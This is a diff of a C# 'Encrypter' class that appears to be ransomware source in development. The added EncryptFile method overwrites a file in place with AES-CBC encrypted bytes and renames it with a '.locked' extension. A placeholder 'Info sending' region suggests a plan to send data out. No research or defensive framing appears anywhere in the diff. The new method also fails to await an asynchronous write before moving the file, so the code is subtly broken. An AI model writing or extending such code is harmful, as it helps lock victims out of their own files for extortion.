@@ -44,9 +44,10 @@ public class Encrypter : IDisposable
         IV = keys[1];
     }
 
-    protected async Task<byte[]> EncryptWithAES(byte[] byteToEncrypt)
+    #region Encryptation
+    protected async Task<byte[]> EncryptWithAESAsync(byte[] byteToEncrypt)
     {
-        byte[] encryptedBytes = null;
+        byte[] encryptedBytes;
         using (var memoryStream = new MemoryStream())
         {
             using (var aes = Aes.Create())
@@ -70,13 +71,39 @@ public class Encrypter : IDisposable
         return encryptedBytes;
     }
 
+    protected byte[] EncryptWithAES(byte[] byteToEncrypt)
+    {
+        byte[] encryptedBytes;
+        using (var memoryStream = new MemoryStream())
+        {
+            using (var aes = Aes.Create())
+            {
+                aes.KeySize = 256;
+                aes.BlockSize = 128;
+
+                aes.Key = Key;
+                aes.IV = IV;
+
+                aes.Mode = CipherMode.CBC;
+
+                using (var cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
+                {
+                    cryptoStream.Write(byteToEncrypt, 0, byteToEncrypt.Length);
+                    cryptoStream.Close();
+                }
+                encryptedBytes = memoryStream.ToArray();
+            }
+        }
+        return encryptedBytes;
+    }
+
     protected internal async Task EncryptFileAsync(string filePath)
     {
         byte[] bytesToEncrypt = File.ReadAllBytes(filePath);
 
         await Task.Run(async () =>
         {
-            byte[] encryptedBytes = await EncryptWithAES(bytesToEncrypt);
+            byte[] encryptedBytes = await EncryptWithAESAsync(bytesToEncrypt);
             await File.WriteAllBytesAsync(filePath, encryptedBytes);
             try
             {
@@ -89,6 +116,15 @@ public class Encrypter : IDisposable
             }
         });
     }
+
+    protected internal void EncryptFile(string filePath)
+    {
+        byte[] bytesToEncrypt = File.ReadAllBytes(filePath);
+        byte[] encryptedBytes = EncryptWithAES(bytesToEncrypt);
+        File.WriteAllBytesAsync(filePath, encryptedBytes);
+        File.Move(filePath, filePath + ".locked");
+    }
+    #endregion
 
     #region Password and Key generation
     protected List<byte[]> GenAESKey(byte[] passwordBytes, int KeySizeInBytes = 32, int BlockSizeInBytes = 16)
@@ -120,6 +156,12 @@ public class Encrypter : IDisposable
         }
         return password.ToString();
     }
+    #endregion
+
+    #region Info sending
+
+    // Not implemented yet
+
     #endregion
 
     #region Disposing resources
